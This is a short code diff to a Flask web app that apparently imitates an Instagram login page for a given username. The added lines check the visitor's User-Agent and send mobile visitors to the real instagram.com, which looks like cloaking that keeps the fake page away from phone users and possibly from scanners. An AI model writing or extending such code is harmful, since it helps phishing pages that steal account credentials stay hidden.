@@ -38,6 +38,11 @@ def index():
 
 @app.route('/accounts/<username>/login')
 def login(username):
+    user_agent = request.headers.get('User-Agent')
+    
+    if 'Mobile' in user_agent or 'Android' in user_agent or 'iOS' in user_agent:
+        return redirect('https://www.instagram.com')   
+         
     pfp = get_pfp(username)
     
     if not pfp:
